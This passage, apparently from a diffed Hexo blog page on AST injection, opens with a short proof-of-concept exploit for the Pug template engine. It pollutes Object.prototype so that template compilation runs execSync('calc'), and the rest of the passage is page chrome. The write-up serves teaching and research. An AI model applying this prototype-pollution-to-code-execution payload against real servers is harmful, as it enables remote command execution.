+<hr>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> pug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>block <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Text"</span><span class="token punctuation">,</span> <span class="token string-property property">"line"</span><span class="token operator">:</span> <span class="token string">"console.log(process.mainModule.require('child_process').execSync('calc').toString())"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> source <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">h1= msg</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> fn <span class="token operator">=</span> pug<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'It works'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/10/AST%E6%B3%A8%E5%85%A5/image-20240210220707451.png" alt="image-20240210220707451"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
